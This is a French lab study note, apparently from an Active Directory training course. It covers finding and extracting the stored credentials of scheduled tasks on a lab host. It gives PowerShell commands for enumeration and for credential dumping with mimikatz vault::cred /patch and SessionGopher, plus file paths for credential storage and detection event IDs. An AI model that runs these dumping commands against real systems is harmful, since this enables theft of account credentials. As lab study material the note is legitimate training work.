---
flag: 12
machine: dcorp-adminsrv
statut: à faire
technique: Credential Vault / DPAPI (post-exploit)
LO: [[LO07 - Session DA et escalade]]
---

# F12 · Source des creds tâches planifiées

> [!summary] Objectif
> Identifier la **source** depuis laquelle on peut extraire en clair les credentials associés à des **tâches planifiées** sur `dcorp-adminsrv` (LSASS ? Registre ? Credential Vault ?).

## Contexte
- **Étape attack flow** : post-exploit sur `dcorp-adminsrv` (branche AppLocker/GPO, séparée de la chaîne `dcorp-mgmt`).
- **Ce qu'on a** : accès admin local / session à `dcorp-adminsrv` (via GPO abuse ou chaîne parallèle).
- **Ce qu'on cherche** : le **nom du store** utilisé par Windows pour persister les creds des scheduled tasks — c'est là que Task Scheduler va chercher le mot de passe quand une tâche tourne sous un compte spécifique.

## Solution

### Étape 1 : lister les tâches planifiées et leurs comptes
```powershell
schtasks /query /fo LIST /v | Select-String "TaskName|Run As User"
Get-ScheduledTask | Where-Object { $_.Principal.UserId -notmatch "SYSTEM|LOCAL SERVICE|NETWORK SERVICE" } `
  | Select-Object TaskName,@{n='RunAs';e={$_.Principal.UserId}}
```

### Étape 2 : énumérer le Credential Vault (le store des schtasks)
Les credentials des tâches planifiées sont stockés dans le **Windows Credential Manager / Vault** (protégés par DPAPI, chiffrés avec la master key du compte propriétaire).

```powershell
# lister les credentials du vault (natif)
cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
```

### Étape 3 : extraction en clair (nécessite contexte du user propriétaire + DPAPI)
```powershell
# via mimikatz — dumper les creds vault + décrypter DPAPI
Invoke-Mimi -Command '"vault::list" "vault::cred /patch"'

# ou via SessionGopher (extraction Credential Manager, PuTTY, WinSCP...)
. C:\AD\Tools\SessionGopher.ps1
Invoke-SessionGopher -AllDomain -Thorough

# ou natif : lister les fichiers du vault
dir /a "C:\Users\<user>\AppData\Local\Microsoft\Credentials\"
dir /a "C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\"
```
→ Voir [[Cheatsheet - Post-exploitation]] pour la variante `Invoke-Mimi`.

## Réponse

| Élément | Valeur |
|---------|--------|
| Source des creds de tâches planifiées | <A REMPLIR DEPUIS LAB> (attendu : `Credential Manager` / `Credential Vault`) |

## Pièges et OPSEC
- Il faut être **dans le contexte du user propriétaire** de la tâche (ou avoir sa DPAPI master key) pour déchiffrer — SYSTEM seul ne suffit pas toujours.
- Ne pas confondre :
  - **LSASS** = secrets **en mémoire** des sessions actives (hash NTLM, tickets Kerberos, clés AES).
  - **SAM/registre** = comptes **locaux** de la box (HKLM\SAM).
  - **Credential Vault / Manager** = credentials **persistés** par des apps / tâches planifiées (dont schtasks avec `/RU /RP`).
- Traces : Event ID **4692** (backup DPAPI master key) et **5379** (Credential Manager credentials read).

## Refs
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Persistence]]
- [[LO07 - Session DA et escalade]]

[[Flags - Index]] · [[Journal - Index]]
